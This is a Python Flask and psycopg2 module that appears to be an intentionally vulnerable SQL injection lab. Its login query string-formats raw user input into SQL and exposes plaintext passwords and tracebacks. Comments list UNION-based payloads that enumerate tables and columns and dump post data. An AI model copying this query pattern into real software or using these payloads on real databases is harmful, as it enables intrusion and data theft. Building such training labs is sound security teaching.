import psycopg2, traceback
from psycopg2 import sql
from functools import wraps
from flask import current_app

# GET TABLES
# ' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema = 'public' --

# GET SCHEMA
# ' UNION SELECT NULL,column_name, NULL,NULL,NULL,NULL FROM information_schema.columns WHERE TABLE_NAME = 'post' --

# GET DATA
# ' UNION SELECT NULL,author,text,NULL,NULL,NULL FROM post --

def connect_db(func):
    @wraps(func)
    def _wrapper(*args, **kwargs):
        conn = psycopg2.connect(
            host=current_app.config.get("DB_HOST"),
            database=current_app.config.get("DB_NAME"),
            user=current_app.config.get("DB_USER"),
            password=current_app.config.get("DB_PASSWORD")
        )
        cursor = conn.cursor()
        kwargs.update({
            "cursor" : cursor
        })
        result = func(*args, **kwargs)
        cursor.close()
        conn.close()
        return result
    return _wrapper

@connect_db
def sqli_query(username, password, cursor = None):
    try:
        cursor.execute(
            sql.SQL('SELECT * FROM public.user \
                WHERE username=\'{}\' and password=\'{}\';'\
                .format(username, password)
                )
            )
        result = {
            "data" : cursor.fetchall(), 
            "status": True
        }
    except Exception as e:
        result = {
            "data" : ''.join(traceback.format_tb(e.__traceback__)),
            "status" : False
        }
    return result
